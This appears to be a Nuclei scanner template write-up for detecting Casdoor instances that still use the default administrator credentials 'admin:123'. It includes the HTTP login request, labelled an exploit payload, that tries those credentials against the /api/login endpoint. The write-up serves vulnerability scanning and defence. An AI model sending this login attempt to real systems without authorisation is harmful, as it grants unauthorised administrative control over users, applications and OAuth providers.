# Nuclei Template: Casdoor - Default Admin Credentials
**Template ID:** casdoor-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`casdoor-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Detected Casdoor platform was found to have been using the default administrator credentials (admin:123). An attacker could have gained full administrative access to manage organizations, users, applications, and OAuth providers.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

POST /api/login HTTP/1.1
Host: {{Hostname}}

{"application":"app-built-in","organization":"built-in","username":"{{username}}","password":"{{password}}","autoSignin":true,"signinMethod":"Password","type":"login"}
```

## References
- https://casdoor.org/docs/basic/core-concepts/
- https://github.com/casdoor/casdoor
